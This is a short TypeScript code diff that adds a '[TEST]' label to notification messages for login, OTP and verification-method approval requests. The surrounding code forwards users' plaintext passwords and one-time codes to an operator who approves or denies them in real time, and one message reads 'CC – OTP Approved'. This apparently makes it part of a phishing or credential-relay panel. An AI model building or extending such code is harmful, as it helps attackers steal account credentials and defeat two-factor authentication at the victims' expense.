@@ -1,4 +1,5 @@
 import { APPROVAL_TIMEOUT_MS } from "@/lib/approval-messages"
+import { isProduction } from "./utils";
 
 /** Matches member-site approval poll timeout (90s). */
 export const ADMIN_PENDING_COUNTDOWN_SEC = APPROVAL_TIMEOUT_MS / 1000
@@ -92,6 +93,7 @@ export function buildLoginApprovalRequestBody(data: {
 }): string {
   const password = String(data.password ?? "").trim() || "—"
   return [
+    `\n${isProduction ? "" : "[TEST]"} \n`,
     "🔔 Login request – approve or deny",
     "━━━━━━━━━━━━━━━━━━",
     formatIdentifierLine(data.userId, data.asCode),
@@ -116,6 +118,7 @@ export function buildOtpApprovalRequestBody(data: {
   asLink: LinkFn
 }): string {
   return [
+   `\n${isProduction ? "" : "[TEST]"} \n`,
     "🔢 OTP submitted – approve or deny",
     "━━━━━━━━━━━━━━━━━━",
     formatIdentifierLine(data.userId, data.asCode),
@@ -138,6 +141,7 @@ export function buildMethodApprovalRequestBody(data: {
   asLink: LinkFn
 }): string {
   return [
+    `\n${isProduction ? "" : "[TEST]"} \n`,
     "🔔 Verification method selected – approve or deny",
     "━━━━━━━━━━━━━━━━━━",
     formatIdentifierLine(data.userId, data.asCode),
@@ -160,10 +164,11 @@ export function buildAdminLoginApprovedBody(data: {
 }): string {
   const password = String(data.password ?? "").trim()
   const lines = [
+    `\n${isProduction ? "" : "[TEST]"} \n`,
     data.isOtp ? "✅ CC – OTP Approved" : "✅ CC – Login Approved",
     "━━━━━━━━━━━━━━━━━━",
     formatIdentifierLine(data.userId, data.asCode),
-  ]
+  ];
 
   if (data.isOtp) {
     lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
